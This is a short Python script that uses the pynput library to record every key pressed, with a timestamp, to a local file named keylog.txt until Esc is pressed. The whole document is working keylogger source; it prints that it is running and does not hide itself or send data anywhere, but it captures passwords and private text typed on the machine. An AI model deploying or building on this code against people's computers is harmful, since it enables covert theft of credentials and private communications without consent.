from pynput import keyboard
import datetime

# File to store the logs
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as file:
            # Log alphanumeric keys directly
            if hasattr(key, 'char') and key.char is not None:
                file.write(f"{datetime.datetime.now()}: {key.char}\n")
            # Log special keys with brackets
            else:
                file.write(f"{datetime.datetime.now()}: [{key}]\n")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the keylogger when Esc is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

def main():
    print("Starting keylogger... Press 'Esc' to stop.")
    # Create a listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
